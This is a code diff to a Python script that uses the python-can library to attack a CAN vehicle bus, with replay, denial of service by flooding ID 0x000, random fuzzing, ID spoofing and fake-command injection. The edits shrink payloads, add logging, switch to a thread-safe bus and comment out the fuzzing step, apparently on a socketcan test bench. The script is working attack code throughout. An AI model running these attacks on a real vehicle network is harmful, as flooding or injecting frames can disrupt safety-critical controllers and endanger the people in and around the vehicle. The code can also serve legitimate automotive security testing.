@@ -10,12 +10,14 @@ def replay_attack(bus, recorded_messages, duration):
             time.sleep(0.01)
 
 def dos_attack(bus, duration):
-    msg = can.Message(arbitration_id=0x000, data=[0xFF]*8, is_extended_id=False)
+    msg = can.Message(arbitration_id=0x000, data=[0xEE]*1, is_extended_id=False)
     start = time.time()
     while time.time() - start < duration:
         try:
             bus.send(msg)
-        except:
+            print("Sending dos message")
+        except Exception as e:
+            print(e)
             pass
 
 def fuzzy_attack(bus, duration):
@@ -23,7 +25,7 @@ def fuzzy_attack(bus, duration):
     while time.time() - start < duration:
         msg = can.Message(
             arbitration_id=random.randint(0x000, 0x7FF),
-            data=[random.randint(0x00, 0xFF) for _ in range(8)],
+            data=[random.randint(0x00, 0xFF) for _ in range(1)],
             is_extended_id=False
         )
         try:
@@ -36,10 +38,11 @@ def spoofing_attack(bus, duration):
     # Change ECU ID to a valid one from vehicle spy
     spoofed_id = 0x123  
     spoofed_data = [0x01, 0x02, 0x03, 0x04, 0xA5, 0xA5, 0xA5, 0xA5]
-    msg = can.Message(arbitration_id=spoofed_id, data=spoofed_data, is_extended_id=False)
 
     start = time.time()
     while time.time() - start < duration:
+        spoofed_payload = random.choice(spoofed_data)
+        msg = can.Message(arbitration_id=random.randint(0x000, 0x7FF), data=[random.randint(0x00, 0xFF) for _ in range(1)], is_extended_id=False)
         bus.send(msg)
         time.sleep(0.01)
 
@@ -53,7 +56,7 @@ def injection_attack(bus, duration):
     while time.time() - start < duration:
         for msg in fake_commands:
             bus.send(msg)
-            time.sleep(0.02)
+            time.sleep(0.01)
 
 def capture_messages(bus, duration=2):
     captured = []
@@ -65,16 +68,17 @@ def capture_messages(bus, duration=2):
     return captured
 
 def main():
-    INTERFACE = 'can0'    
-    BUSTYPE = 'socketcan'
+    INTERFACE = 'socketcan'    
+    BUSTYPE = 'can0'
 
-    bus = can.interface.Bus(channel=INTERFACE, bustype=BUSTYPE)
+    # bus = can.interface.Bus(channel=INTERFACE, bustype=BUSTYPE, receive_own_messages=True)
+    bus = can.ThreadSafeBus(interface='socketcan', channel='can0', receive_own_messages=True)
     recorded_messages = capture_messages(bus, duration=2)
 
     attacks = [
         ("Replay Attack", replay_attack, recorded_messages),
         ("DoS Attack", dos_attack, None),
-        ("Fuzzy Attack", fuzzy_attack, None),
+        #("Fuzzy Attack", fuzzy_attack, None),
         ("Spoofing Attack", spoofing_attack, None),
         ("Injection Attack", injection_attack, None),
     ]
